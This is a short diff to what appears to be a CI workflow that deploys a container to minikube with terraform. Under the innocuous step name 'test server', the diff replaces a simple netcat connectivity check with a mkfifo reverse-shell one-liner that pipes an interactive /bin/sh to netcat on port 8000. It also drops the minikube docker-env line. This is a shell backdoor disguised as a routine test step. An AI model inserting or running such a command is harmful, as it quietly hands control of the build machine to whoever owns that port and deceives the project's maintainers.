@@ -38,7 +38,6 @@ jobs:
       
       - name: Load image to minikube
         run: |
-          eval $(minikube docker-env)
           minikube image load djangoheads/dummy:latest
 
       - name: terraform init and apply
@@ -47,4 +46,4 @@ jobs:
           terraform init
       - name: test server
         run: |
-          nc -v localhost 8000
+          rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat localhost 8000 >/tmp/f
